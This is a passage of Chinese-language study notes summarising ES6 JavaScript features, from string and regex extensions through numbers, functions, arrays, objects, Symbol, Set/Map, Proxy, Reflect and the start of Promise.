只有indexOf方法，可以用来确定一个字符串是否包含在另一个字符串中\r\n- includes()：返回布尔值，表示是否找到了参数字符串\r\n- startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部\r\n- endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部\r\n\r\n### repeat()\r\n\r\n- repeat方法返回一个新字符串，表示将原字符串重复n次\r\n- 参数如果是小数，会被取整\r\n- 如果repeat的参数是负数或者Infinity，会报错\r\n- 如果参数是 0 到-1 之间的小数\r\n\r\n### padStart()，padEnd()\r\n\r\n- 如果某个字符串不够指定长度，会在头部或尾部补全。padStart()用于头部补全，padEnd()用于尾部补全\r\n- padStart和padEnd一共接受两个参数，第一个参数用来指定字符串的最小长度，第二个参数是用来补全的字符串\r\n- 如果原字符串的长度，等于或大于指定的最小长度，则返回原字符串\r\n- 如果用来补全的字符串与原字符串，两者的长度之和超过了指定的最小长度，则会截去超出位数的补全字符串\r\n- 如果省略第二个参数，默认使用空格补全长度\r\n\r\n### matchAll()\r\n\r\n- matchAll方法返回一个正则表达式在当前字符串的所有匹配\r\n\r\n### 模板字符串\r\n\r\n- 模板字符串（template string）是增强版的字符串，用反引号（`）标识\r\n- 如果在模板字符串中需要使用反引号，则前面要用反斜杠转义\r\n- 如果使用模板字符串表示多行字符串，所有的空格和缩进都会被保留在输出之中\r\n- 模板字符串中嵌入变量，需要将变量名写在${}之中\r\n- 模板字符串之中还能调用函数\r\n- 模板字符串甚至还能嵌套。\r\n\r\n### 实例：模板编译\r\n\r\n- 该模板使用<%...%>放置 JavaScript 代码，使用<%= ... %>输出 JavaScript 表达式\r\n\r\n### 标签模板\r\n\r\n- “标签模板”的一个重要应用，就是过滤 HTML 字符串，防止用户输入恶意内容\r\n\r\n### String.raw()\r\n\r\n- String.raw方法，往往用来充当模板字符串的处理函数，返回一个斜杠都被转义（即斜杠前面再加一个斜杠）\r\n的字符串，对应于替换变量后的模板字符串\r\n\r\n### 模板字符串的限制\r\n\r\n- 模板字符串默认会将字符串转义，导致无法嵌入其他语言\r\n\r\n## 正则的扩展\r\n\r\n### RegExp 构造函数\r\n\r\n- 第一种情况是，参数是字符串，这时第二个参数表示正则表达式的修饰符\r\n- 第二种情况是，参数是一个正则表示式，这时会返回一个原有正则表达式的拷贝\r\n- ES5 不允许此时使用第二个参数添加修饰符，否则会报错\r\n- ES6 改变了这种行为。如果RegExp构造函数第一个参数是一个正则对象，那么可以使用第二个参数指定修饰符\r\n\r\n### 字符串的正则方法\r\n\r\n- 字符串对象共有 4 个方法，可以使用正则表达式：match()、replace()、search()和split()\r\n\r\n### u 修饰符\r\n\r\n- ES6 对正则表达式添加了u修饰符，含义为“Unicode 模式”，用来正确处理大于\\uFFFF的 Unicode 字符\r\n- 点（.）字符在正则表达式中，含义是除了换行符以外的任意单个字符\r\n- 对于码点大于0xFFFF的 Unicode 字符，点字符不能识别，必须加上u修饰符\r\n- ES6 新增了使用大括号表示 Unicode 字符，这种表示法在正则表达式中必须加上u修饰符，才能识别当中的大括号，否则会被解读为量词\r\n- 使用u修饰符后，所有量词都会正确识别码点大于0xFFFF的 Unicode 字符\r\n- u修饰符也影响到预定义模式，能否正确识别码点大于0xFFFF的 Unicode 字符\r\n\r\n### RegExp.prototype.unicode 属性\r\n\r\n- 正则实例对象新增unicode属性，表示是否设置了u修饰符\r\n\r\n### y 修饰符\r\n\r\n- ES6 还为正则表达式添加了y修饰符，叫做“粘连”（sticky）修饰符\r\n\r\n### RegExp.prototype.sticky 属性\r\n\r\n- 与y修饰符相匹配，ES6 的正则实例对象多了sticky属性，表示是否设置了y修饰符\r\n\r\n### RegExp.prototype.flags 属性\r\n\r\n- ES6 为正则表达式新增了flags属性，会返回正则表达式的修饰符\r\n\r\n### s 修饰符：dotAll 模式\r\n\r\n- 正则表达式中，点（.）是一个特殊字符，代表任意的单个字符，但是有两个例外\r\n- 一个是四个字节的 UTF-16 字符，这个可以用u修饰符解决；另一个是行终止符\r\n- 这被称为dotAll模式，即点（dot）代表一切字符。所以，正则表达式还引入了一个dotAll属性，返回一个布尔值，表示该正则表达式是否处在dotAll模式\r\n\r\n### 后行断言\r\n\r\n- ”先行断言“指的是，x只有在y前面才匹配，必须写成/x(?=y)/\r\n- “后行断言”正好与“先行断言”相反，x只有在y后面才匹配，必须写成/(?<=y)x/\r\n\r\n### Unicode 属性类\r\n\r\n- ES2018 引入了一种新的类的写法\\p{...}和\\P{...}，允许正则表达式匹配符合 Unicode 某种属性的所有字符\r\n\r\n### 具名组匹配\r\n\r\n- 正则表达式使用圆括号进行组匹配\r\n- 有了具名组匹配以后，可以使用解构赋值直接从匹配结果上为变量赋值\r\n- 如果要在正则表达式内部引用某个“具名组匹配”，可以使用\\k<组名>的写法\r\n\r\n### String.prototype.matchAll\r\n\r\n- 如果一个正则表达式在字符串里面有多个匹配，现在一般使用g修饰符或y修饰符，在循环里面逐一取出\r\n\r\n## 数值的扩展\r\n\r\n### 二进制和八进制表示法\r\n\r\n- ES6 提供了二进制和八进制数值的新的写法，分别用前缀0b（或0B）和0o（或0O）表示\r\n\r\n### Number.isFinite(), Number.isNaN()\r\n\r\n- Number.isFinite()用来检查一个数值是否为有限的（finite），即不是Infinity\r\n- Number.isNaN()用来检查一个值是否为NaN，如果参数类型不是NaN，Number.isNaN一律返回false\r\n- 传统方法先调用Number()将非数值的值转为数值，再进行判断，而这两个新方法只对数值有效\r\n- Number.isFinite()对于非数值一律返回false, Number.isNaN()只有对于NaN才返回true，非NaN一律返回false\r\n\r\n### Number.parseInt(), Number.parseFloat()\r\n\r\n- ES6 将全局方法parseInt()和parseFloat()，移植到Number对象上面，行为完全保持不变\r\n\r\n### Number.isInteger()\r\n\r\n- Number.isInteger()用来判断一个数值是否为整数\r\n- JavaScript 内部，整数和浮点数采用的是同样的储存方法，所以 25 和 25.0 被视为同一个值\r\n\r\n### Number.EPSILON\r\n\r\n- ES6 在Number对象上面，新增一个极小的常量Number.EPSILON。根据规格，它表示 1 与大于 1 的最小浮点数之间的差\r\n- Number.EPSILON实际上是 JavaScript 能够表示的最小精度。误差如果小于这个值，就可以认为已经没有意义了，即不存在误差了\r\n\r\n### 安全整数和 Number.isSafeInteger()\r\n\r\n- JavaScript 能够准确表示的整数范围在-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示这个值\r\n- Number.isSafeInteger()则是用来判断一个整数是否落在这个范围之内\r\n\r\n### Math 对象的扩展\r\n\r\n- ES6 在 Math 对象上新增了 17 个与数学相关的方法。所有这些方法都是静态方法，只能在 Math 对象上调用\r\n- Math.trunc方法用于去除一个数的小数部分，返回整数部分\r\n- Math.sign方法用来判断一个数到底是正数、负数、还是零\r\n- Math.cbrt方法用于计算一个数的立方根\r\n- JavaScript 的整数使用 32 位二进制形式表示，Math.clz32方法返回一个数的 32 位无符号整数形式有多少个前导 0\r\n- Math.imul方法返回两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数\r\n- Math.fround方法返回一个数的32位单精度浮点数形式\r\n- Math.hypot方法返回所有参数的平方和的平方根\r\n- Math.expm1(x)返回 ex - 1，即Math.exp(x) - 1\r\n- Math.log1p(x)方法返回1 + x的自然对数，即Math.log(1 + x)。如果x小于-1，返回NaN\r\n- Math.log10(x)返回以 10 为底的x的对数。如果x小于 0，则返回 NaN\r\n- Math.log2(x)返回以 2 为底的x的对数。如果x小于 0，则返回 NaN\r\n- Math.sinh(x) 返回x的双曲正弦（hyperbolic sine）\r\n- Math.cosh(x) 返回x的双曲余弦（hyperbolic cosine）\r\n- Math.tanh(x) 返回x的双曲正切（hyperbolic tangent）\r\n- Math.asinh(x) 返回x的反双曲正弦（inverse hyperbolic sine）\r\n- Math.acosh(x) 返回x的反双曲余弦（inverse hyperbolic cosine）\r\n- Math.atanh(x) 返回x的反双曲正切（inverse hyperbolic tangent）\r\n\r\n### 指数运算符\r\n\r\n- ES2016 新增了一个指数运算符（**）\r\n- 指数运算符可以与等号结合，形成一个新的赋值运算符（**=）\r\n\r\n## 函数的扩展\r\n\r\n### 函数参数的默认值\r\n\r\n- ES6 允许为函数的参数设置默认值，即直接写在参数定义的后面\r\n- 参数变量是默认声明的，所以不能用let或const再次声明。\r\n- 使用参数默认值时，函数不能有同名参数\r\n- 参数默认值是惰性求值的\r\n- 参数默认值可以与解构赋值的默认值，结合起来使用\r\n- 默认值的参数都不是尾参数。这时，无法只省略该参数，而不省略它后面的参数，除非显式输入undefined\r\n- 如果传入undefined，将触发该参数等于默认值，null则没有这个效果\r\n- 指定了默认值以后，函数的length属性，将返回没有指定默认值的参数个数\r\n- 指定了默认值后，length属性将失真\r\n- 利用参数默认值，可以指定某一个参数不得省略，如果省略就抛出一个错误\r\n\r\n### rest 参数\r\n\r\n- ES6 引入 rest 参数（形式为...变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了\r\n- rest 参数就不存在这个问题，它就是一个真正的数组，数组特有的方法都可以使用\r\n\r\n### 严格模式\r\n\r\n- ES2016 做了一点修改，规定只要函数参数使用了默认值、解构赋值、或者扩展运算符，\r\n那么函数内部就不能显式设定为严格模式，否则会报错\r\n- 设定全局性的严格模式，这是合法的\r\n- 函数包在一个无参数的立即执行函数里面\r\n\r\n### name 属性\r\n\r\n- 函数的name属性，返回该函数的函数名。\r\n- 如果将一个匿名函数赋值给一个变量，ES5 的name属性，会返回空字符串，而 ES6 的name属性会返回实际的函数名\r\n- 如果将一个具名函数赋值给一个变量，则 ES5 和 ES6 的name属性都返回这个具名函数原本的名字\r\n- Function构造函数返回的函数实例，name属性的值为anonymous\r\n- bind返回的函数，name属性值会加上bound前缀\r\n\r\n### 箭头函数\r\n\r\n- ES6 允许使用“箭头”（=>）定义函数\r\n- 如果箭头函数不需要参数或需要多个参数，就使用一个圆括号代表参数部分\r\n- 如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来，并且使用return语句返回\r\n- （1）函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。\r\n- （2）不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。\r\n- （3）不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。\r\n- （4）不可以使用yield命令，因此箭头函数不能用作 Generator 函数\r\n- 箭头函数内部，还可以再使用箭头函数\r\n\r\n### 双冒号运算符\r\n\r\n- 现在有一个提案，提出了“函数绑定”（function bind）运算符，用来取代call、apply、bind调用\r\n- 函数绑定运算符是并排的两个冒号（::），双冒号左边是一个对象，右边是一个函数\r\n- 该运算符会自动将左边的对象，作为上下文环境（即this对象），绑定到右边的函数上面\r\n- 如果双冒号运算符的运算结果，还是一个对象，就可以采用链式写法\r\n\r\n### 尾调用优化\r\n\r\n- 尾调用（Tail Call）是函数式编程的一个重要概念，本身非常简单，一句话就能说清楚，就是指某个函数的最后一步是调用另一个函数\r\n- 尾调用不一定出现在函数尾部，只要是最后一步操作即可\r\n- 如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存\r\n- 函数调用自身，称为递归。如果尾调用自身，就称为尾递归\r\n\r\n### 函数参数的尾逗号\r\n\r\n- ES2017 允许函数的最后一个参数有尾逗号（trailing comma）\r\n\r\n## 数组的扩展\r\n\r\n### 扩展运算符\r\n\r\n- 扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列\r\n- 由于扩展运算符可以展开数组，所以不再需要apply方法，将数组转为函数的参数了\r\n- 数组是复合的数据类型，直接复制的话，只是复制了指向底层数据结构的指针，而不是克隆一个全新的数组\r\n- 扩展运算符提供了数组合并的新写法。\r\n- 扩展运算符可以与解构赋值结合起来，用于生成数组\r\n- 扩展运算符还可以将字符串转为真正的数组。\r\n- 任何 Iterator 接口的对象（参阅 Iterator 一章），都可以用扩展运算符转为真正的数组\r\n- Map 和 Set 结构，Generator 函数\r\n\r\n### Array.from()\r\n\r\n- Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map\r\n- Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组\r\n\r\n### Array.of()\r\n\r\n- Array.of方法用于将一组值，转换为数组\r\n- 这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异\r\n- Array.of基本上可以用来替代Array()或new Array()，并且不存在由于参数不同而导致的重载\r\n\r\n### 数组实例的 copyWithin()\r\n\r\n- 数组实例的copyWithin方法，在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组\r\n\r\n### 数组实例的 find() 和 findIndex()\r\n\r\n- 数组实例的find方法，用于找出第一个符合条件的数组成员\r\n- 它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员\r\n- 如果没有符合条件的成员，则返回undefined\r\n- 数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1\r\n- 这两个方法都可以接受第二个参数，用来绑定回调函数的this对象\r\n\r\n### 数组实例的 fill()\r\n\r\n- fill方法使用给定值，填充一个数组。\r\n- 如果填充的类型为对象，那么被赋值的是同一个内存地址的对象，而不是深拷贝对象\r\n\r\n### 数组实例的 entries()，keys() 和 values()\r\n\r\n- ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组\r\n- 它们都返回一个遍历器对象，可以用for...of循环进行遍历\r\n- 如果不使用for...of循环，可以手动调用遍历器对象的next方法，进行遍历\r\n\r\n### 数组实例的 includes()\r\n\r\n- Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似\r\n- Map 和 Set 数据结构有一个has方法，需要注意与includes区分\r\n\r\n### 数组的空位\r\n\r\n- 数组的空位指，数组的某一个位置没有任何值\r\n- Array.from方法会将数组的空位，转为undefined，也就是说，这个方法不会忽略空位\r\n- 扩展运算符（...）也会将空位转为undefined\r\n- copyWithin()会连空位一起拷贝\r\n- fill()会将空位视为正常的数组位置\r\n- for...of循环也会遍历空位\r\n- entries()、keys()、values()、find()和findIndex()会将空位处理成undefined\r\n\r\n## 对象的扩展\r\n\r\n### 属性的简洁表示法\r\n\r\n- ES6 允许直接写入变量和函数，作为对象的属性和方法。这样的书写更加简洁。\r\n\r\n### 属性名表达式\r\n\r\n- JavaScript 定义对象的属性，有两种方法\r\n- 方法一是直接用标识符作为属性名，方法二是用表达式作为属性名，这时要将表达式放在方括号之内\r\n- 注意，属性名表达式如果是一个对象，默认情况下会自动将对象转为字符串[object Object]\r\n\r\n### 方法的 name 属性\r\n\r\n- 函数的name属性，返回函数名。对象方法也是函数，因此也有name属性\r\n- 如果对象的方法使用了取值函数（getter）和存值函数（setter），则name属性不是在该方法上面，\r\n而是该方法的属性的描述对象的get和set属性上面，返回值是方法名前加上get和set\r\n- bind方法创造的函数，name属性返回bound加上原函数的名字；\r\n- Function构造函数创造的函数，name属性返回anonymous\r\n- 如果对象的方法是一个 Symbol 值，那么name属性返回的是这个 Symbol 值的描述\r\n\r\n### Object.is()\r\n\r\n- 用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致\r\n- 不同之处只有两个：一是+0不等于-0，二是NaN等于自身\r\n\r\n### Object.assign()\r\n\r\n- Object.assign方法用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）\r\n- 如果目标对象与源对象有同名属性，或多个源对象有同名属性，则后面的属性会覆盖前面的属性\r\n- 如果非对象参数出现在源对象的位置（即非首参数），那么处理规则有所不同。首先，这些参数都会转成对象，如果无法转成对象，就会跳过\r\n- 这意味着，如果undefined和null不在首参数，就不会报错\r\n- Object.assign拷贝的属性是有限制的，只拷贝源对象的自身属性（不拷贝继承属性），也不拷贝不可枚举的属性（enumerable: false）\r\n- Object.assign方法实行的是浅拷贝，而不是深拷贝。也就是说，如果源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用\r\n- 遇到同名属性，Object.assign的处理方法是替换，而不是添加\r\n- Object.assign可以用来处理数组，但是会把数组视为对象\r\n- Object.assign只能进行值的复制，如果要复制的值是一个取值函数，那么将求值后再复制\r\n- 为对象添加属性\r\n- 为对象添加方法\r\n- 克隆对象\r\n- 合并多个对象\r\n- 为属性指定默认值\r\n\r\n### 属性的可枚举性和遍历\r\n\r\n- 对象的每个属性都有一个描述对象（Descriptor），用来控制该属性的行为\r\n- Object.getOwnPropertyDescriptor方法可以获取该属性的描述对象\r\n- for...in循环：只遍历对象自身的和继承的可枚举的属性。\r\n- Object.keys()：返回对象自身的所有可枚举的属性的键名。\r\n- JSON.stringify()：只串行化对象自身的可枚举的属性。\r\n- Object.assign()： 忽略enumerable为false的属性，只拷贝对象自身的可枚举的属性\r\n- 引入“可枚举”（enumerable）这个概念的最初目的，就是让某些属性可以规避掉for...in操作，不然所有内部属性和方法都会被遍历到\r\n- 属性的遍历\r\n\r\n\t- for...in\r\n\t- Object.keys(obj)\r\n\t- Object.getOwnPropertyNames(obj)\r\n\t- Object.getOwnPropertySymbols(obj)\r\n\t- Reflect.ownKeys(obj)\r\n\t- 首先遍历所有数值键，按照数值升序排列。\r\n\t- 其次遍历所有字符串键，按照加入时间升序排列。\r\n\t- 最后遍历所有 Symbol 键，按照加入时间升序排列。\r\n\r\n### Object.getOwnPropertyDescriptors()\r\n\r\n- ES2017 引入了Object.getOwnPropertyDescriptors方法，返回指定对象所有自身属性（非继承属性）的描述对象\r\n- 该方法的引入目的，主要是为了解决Object.assign()无法正确拷贝get属性和set属性的问题\r\n\r\n### __proto__属性，Object.setPrototypeOf()，Object.getPrototypeOf()\r\n\r\n- ES6 规定__proto__只有浏览器要部署，其他环境不用部署\r\n- __proto__属性（前后各两个下划线），用来读取或设置当前对象的prototype对象\r\n- Object.setPrototypeOf方法的作用与__proto__相同，用来设置一个对象的prototype对象，返回参数对象本身\r\n- 该方法与Object.setPrototypeOf方法配套，用于读取一个对象的原型对象\r\n\r\n### super 关键字\r\n\r\n- ES6 又新增了另一个类似的关键字super，指向当前对象的原型对象\r\n- super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错\r\n\r\n### Object.keys()，Object.values()，Object.entries()\r\n\r\n- ES5 引入了Object.keys方法，返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键名\r\n- ES2017 引入了跟Object.keys配套的Object.values和Object.entries，作为遍历一个对象的补充手段，供for...of循环使用\r\n- Object.values方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值\r\n- 返回数组的成员顺序\r\n- Object.values会过滤属性名为 Symbol 值的属性\r\n- Object.entries方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对数组\r\n\r\n### 对象的扩展运算符\r\n\r\n- 运算符（...）ES2018 将这个运算符引入了对象\r\n- 对象的解构赋值用于从一个对象取值，相当于将目标对象自身的所有可遍历的（enumerable）、但尚未被读取的属性，分配到指定的对象上面\r\n- 由于解构赋值要求等号右边是一个对象，所以如果等号右边是undefined或null，就会报错，因为它们无法转为对象\r\n- 解构赋值必须是最后一个参数，否则会报错\r\n\r\n## Symbol\r\n\r\n### 概述\r\n\r\n- ES5 的对象属性名都是字符串，这容易造成属性名的冲突\r\n- Symbol的引入，保证每个属性的名字都是独一无二的就好了，这样就从根本上防止属性名的冲突\r\n- 它是 JavaScript 语言的第七种数据类型，前六种是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）\r\n- Symbol函数前不能使用new命令，否则会报错\r\n- Symbol 值不是对象，所以不能添加属性\r\n- Symbol 值不能与其他类型的值进行运算，会报错\r\n- Symbol 值可以显式转为字符串\r\n- Symbol 值也可以转为布尔值，但是不能转为数值\r\n\r\n### 作为属性名的 Symbol\r\n\r\n- 由于每一个 Symbol 值都是不相等的，这意味着 Symbol 值可以作为标识符，用于对象的属性名，就能保证不会出现同名的属性\r\n- Symbol 值作为对象属性名时，不能用点运算符\r\n\r\n### 实例：消除魔术字符串\r\n\r\n- 魔术字符串指的是，在代码之中多次出现、与代码形成强耦合的某一个具体的字符串或者数值\r\n- 常用的消除魔术字符串的方法，就是把它写成一个变量。\r\n\r\n### 属性名的遍历\r\n\r\n- Symbol 作为属性名，该属性不会出现在for...in、for...of循环中，也不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回\r\n- 有一个Object.getOwnPropertySymbols方法，可以获取指定对象的所有 Symbol 属性名\r\n- Reflect.ownKeys方法可以返回所有类型的键名，包括常规键名和 Symbol 键名\r\n\r\n### Symbol.for()，Symbol.keyFor()\r\n\r\n- 我们希望重新使用同一个 Symbol 值，Symbol.for方法可以做到这一点\r\n- 它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值\r\n- 如果有，就返回这个 Symbol 值，否则就新建并返回一个以该字符串为名称的 Symbol 值\r\n- Symbol.for()不会每次调用就返回一个新的 Symbol 类型的值，而是会先检查给定的key是否已经存在，如果不存在才会新建一个值\r\n- Symbol.keyFor方法返回一个已登记的 Symbol 类型值的key\r\n\r\n### 实例：模块的 Singleton 模式\r\n\r\n- Singleton 模式指的是调用一个类，任何时候返回的都是同一个实例\r\n- 如果键名使用Symbol方法生成，那么外部将无法引用这个值，当然也就无法改写。\r\n\r\n### 内置的 Symbol 值\r\n\r\n- 除了定义自己使用的 Symbol 值以外，ES6 还提供了 11 个内置的 Symbol 值，指向语言内部使用的方法\r\n- 对象的Symbol.hasInstance属性，指向一个内部方法\r\n- 对象的Symbol.isConcatSpreadable属性等于一个布尔值，表示该对象用于Array.prototype.concat()时，是否可以展开\r\n- 对象的Symbol.species属性，指向一个构造函数。创建衍生对象时，会使用该属性\r\n- 对象的Symbol.match属性，指向一个函数。当执行str.match(myObject)时，如果该属性存在，会调用它，返回该方法的返回值\r\n- 对象的Symbol.replace属性，指向一个方法，当该对象被String.prototype.replace方法调用时，会返回该方法的返回值\r\n- 对象的Symbol.search属性，指向一个方法，当该对象被String.prototype.search方法调用时，会返回该方法的返回值\r\n- 对象的Symbol.split属性，指向一个方法，当该对象被String.prototype.split方法调用时，会返回该方法的返回值\r\n- 对象的Symbol.iterator属性，指向该对象的默认遍历器方法。\r\n- 对象的Symbol.toPrimitive属性，指向一个方法。该对象被转为原始类型的值时，会调用这个方法，返回该对象对应的原始类型值\r\n- 对象的Symbol.toStringTag属性，指向一个方法。在该对象上面调用Object.prototype.toString方法时，\r\n如果这个属性存在，它的返回值会出现在toString方法返回的字符串之中，表示对象的类型\r\n- 对象的Symbol.unscopables属性，指向一个对象。该对象指定了使用with关键字时，哪些属性会被with环境排除\r\n\r\n## Set 和 Map 数据结构\r\n\r\n### Set\r\n\r\n- ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值\r\n- 上面代码向 Set 实例添加了两个NaN，但是只能加入一个。这表明，在 Set 内部，两个NaN是相等\r\n- Set.prototype.constructor：构造函数，默认就是Set函数。\r\n- Set.prototype.size：返回Set实例的成员总数\r\n- add(value)：添加某个值，返回 Set 结构本身。\r\n- delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。\r\n- has(value)：返回一个布尔值，表示该值是否为Set的成员。\r\n- clear()：清除所有成员，没有返回值。\r\n- keys()：返回键名的遍历器\r\n- values()：返回键值的遍历器\r\n- entries()：返回键值对的遍历器\r\n- forEach()：使用回调函数遍历每个成员\r\n\r\n### WeakSet\r\n\r\n- WeakSet 结构与 Set 类似，也是不重复的值的集合\r\n- WeakSet 的成员只能是对象，而不能是其他类型的值\r\n- WeakSet 中的对象都是弱引用，即垃圾回收机制不考虑 WeakSet 对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中\r\n- WeakSet 是一个构造函数，可以使用new命令，创建 WeakSet 数据结构\r\n- WeakSet.prototype.add(value)：向 WeakSet 实例添加一个新成员。\r\n- WeakSet.prototype.delete(value)：清除 WeakSet 实例的指定成员。\r\n- WeakSet.prototype.has(value)：返回一个布尔值，表示某个值是否在 WeakSet 实例之中。\r\n- WeakSet 不能遍历，是因为成员都是弱引用，随时可能消失，遍历机制无法保证成员的存在，很可能刚刚遍历结束，成员就取不到了\r\n\r\n### Map\r\n\r\n- 它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键\r\n- 事实上，不仅仅是数组，任何具有 Iterator 接口、且每个成员都是一个双元素的数组的数据结构都可以当作Map构造函数的参数\r\n- size属性返回 Map 结构的成员总数。\r\n- set方法设置键名key对应的键值为value，然后返回整个 Map 结构。\r\n- get方法读取key对应的键值，如果找不到key，返回undefined\r\n- has方法返回一个布尔值，表示某个键是否在当前 Map 对象之中\r\n- delete方法删除某个键，返回true。如果删除失败，返回false\r\n- clear方法清除所有成员，没有返回值\r\n- keys()：返回键名的遍历器。\r\n- values()：返回键值的遍历器。\r\n- entries()：返回所有成员的遍历器。\r\n- forEach()：遍历 Map 的所有成员。\r\n\r\n### WeakMap\r\n\r\n- WeakMap结构与Map结构类似，也是用于生成键值对的集合。\r\n- WeakMap只接受对象作为键名（null除外），不接受其他类型的值作为键名\r\n- WeakMap的键名所指向的对象，不计入垃圾回收机制\r\n- WeakMap 与 Map 在 API 上的区别主要是两个，一是没有遍历操作（即没有keys()、values()和entries()方法），也没有size属性\r\n- WeakMap只有四个方法可用：get()、set()、has()、delete()\r\n\r\n## Proxy\r\n\r\n### 概述\r\n\r\n- Proxy 用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”（meta programming），即对编程语言进行编程\r\n- ES6 原生提供 Proxy 构造函数，用来生成 Proxy 实例\r\n\r\n### Proxy 实例的方法\r\n\r\n- get(target, propKey, receiver)：拦截对象属性的读取，比如proxy.foo和proxy['foo']。\r\n- set(target, propKey, value, receiver)：拦截对象属性的设置，比如proxy.foo = v或proxy['foo'] = v，返回一个布尔值。\r\n- has(target, propKey)：拦截propKey in proxy的操作，返回一个布尔值。\r\n- deleteProperty(target, propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值。\r\n- ownKeys(target)：拦截Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in循环，返回一个数组。该方法返回目标对象所有自身的属性的属性名，而Object.keys()的返回结果仅包括目标对象自身的可遍历属性。\r\n- getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象。\r\n- defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值。\r\n- preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值。\r\n- getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象。\r\n- isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值。\r\n- setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值。如果目标对象是函数，那么还有两种额外操作可以拦截。\r\n- apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作，比如proxy(...args)、proxy.call(object, ...args)、proxy.apply(...)。\r\n- construct(target, args)：拦截 Proxy 实例作为构造函数调用的操作，比如new proxy(...args)。\r\n\r\n### Proxy.revocable()\r\n\r\n- Proxy.revocable方法返回一个可取消的 Proxy 实例。\r\n\r\n### this 问题\r\n\r\n- 虽然 Proxy 可以代理针对目标对象的访问，但它不是目标对象的透明代理，即不做任何拦截的情况下，也无法保证与目标对象的行为一致\r\n\r\n### 实例：Web 服务的客户端\r\n\r\n- Proxy 对象可以拦截目标对象的任意属性，这使得它很合适用来写 Web 服务的客户端\r\n\r\n## Reflect\r\n\r\n### 概述\r\n\r\n- Reflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API\r\n-  将Object对象的一些明显属于语言内部的方法（比如Object.defineProperty），放到Reflect对象上\r\n- 修改某些Object方法的返回结果，让其变得更合理\r\n- 让Object操作都变成函数行为\r\n- Reflect对象的方法与Proxy对象的方法一一对应，只要是Proxy对象的方法，就能在Reflect对象上找到对应的方法\r\n\r\n### 静态方法\r\n\r\n- Reflect.apply(target, thisArg, args)\r\n- Reflect.construct(target, args)\r\n- Reflect.get(target, name, receiver)\r\n- Reflect.set(target, name, value, receiver)\r\n- Reflect.defineProperty(target, name, desc)\r\n- Reflect.deleteProperty(target, name)\r\n- Reflect.has(target, name)\r\n- Reflect.ownKeys(target)\r\n- Reflect.isExtensible(target)\r\n- Reflect.preventExtensions(target)\r\n- Reflect.getOwnPropertyDescriptor(target, name)\r\n- Reflect.getPrototypeOf(target)\r\n- Reflect.setPrototypeOf(target, prototype)\r\n\r\n### 实例：使用 Proxy 实现观察者模式\r\n\r\n- 观察者模式（Observer mode）指的是函数自动观察数据对象，一旦对象有变化，函数就会自动执行\r\n\r\n## Promise\r\n\r\n### Promise 的含义\r\n\r\n- Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大\r\n- 对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）\r\n- 一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从pending变为fulfilled和从pending变为rejected\r\n\r\n### 基本用法\r\n\r\n- ES6 规定，Promise对象是一个构造函数，用来生成Promise实例\r\n\r\n### Promise.prototype.then()\r\n\r\n- Promise 实例具有then方法，也就是说，then方法是定义在原型对象Promise.prototype上的\r\n- 可以采用链式写法，即then方法后面再调用另一个then方法\r\n\r\n### Promise.prototype.catch()\r\n\r\n- Promise.prototype.catch方法是.then(null, 